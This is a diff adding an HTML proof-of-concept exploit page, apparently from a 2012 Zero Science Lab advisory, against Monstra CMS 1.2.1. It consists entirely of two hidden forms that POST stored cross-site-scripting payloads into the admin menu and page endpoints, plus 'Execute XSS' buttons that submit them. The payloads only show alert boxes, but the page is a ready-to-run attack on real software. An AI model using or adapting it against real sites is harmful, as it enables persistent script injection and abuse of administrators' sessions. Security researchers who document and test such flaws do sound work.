@@ -1,0 +1,43 @@
+&lt;html&gt;
+&lt;head&gt;
+&lt;title&gt;Monstra 1.2.1 Multiple HTML Injection Vulnerabilities&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;form id=&quot;add_menu&quot; method=&quot;POST&quot; action=&quot;http://www.example.com/monstra/admin/index.php?id=menu&amp;action=add&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;csrf&quot;  value=&quot;a7de775dce681ae31b7e8954d6305667b0df69e0&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;menu_add_item&quot; value=&quot;Save&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;menu_item_link&quot; value=&#039;&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;&#039; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;menu_item_name&quot; value=&#039;&quot;&gt;&lt;script&gt;alert(2);&lt;/script&gt;&#039; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;menu_item_order&quot; value=&quot;0&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;menu_item_target&quot; value=&quot;&quot; /&gt;
+&lt;/form&gt;
+
+&lt;form id=&quot;add_page&quot; method=&quot;POST&quot; action=&quot;http://www.example.com/monstra/admin/index.php?id=pages&amp;action=add_page&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;add_page_and_exit&quot; value=&quot;Save and exit&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;csrf&quot;  value=&quot;a7de775dce681ae31b7e8954d6305667b0df69e0&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;day&quot; value=&quot;21&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;editor&quot; value=&quot;Tojmi Sesvidja&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;minute&quot; value=&quot;17&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;month&quot; value=&quot;08&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;page_description&quot; value=&quot;Zero Science Lab&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;page_keywords&quot; value=&quot;ZSL-2012-5101&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;page_name&quot; value=&quot;XSS&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;page_title&quot; value=&#039;&quot;&gt;&lt;script&gt;alert(3);&lt;/script&gt;&#039; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;pages&quot; value=&quot;0&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;second&quot; value=&quot;29&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;status&quot; value=&quot;published&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;templates&quot; value=&quot;index&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;year&quot; value=&quot;2012&quot; /&gt;
+&lt;/form&gt;
+
+&lt;script type=&quot;text/javascript&quot;&gt;
+function xss1(){document.forms[&quot;add_menu&quot;].submit();}
+function xss2(){document.forms[&quot;add_page&quot;].submit();}
+&lt;/script&gt;
+
+&lt;input type=&quot;button&quot; value=&quot;Execute XSS 1&quot; onClick=&quot;xss1()&quot; /&gt;
+&lt;br /&gt;&lt;br /&gt;
+&lt;input type=&quot;button&quot; value=&quot;Execute XSS 2&quot; onClick=&quot;xss2()&quot; /&gt;
+
+&lt;/body&gt;
+&lt;/html&gt;
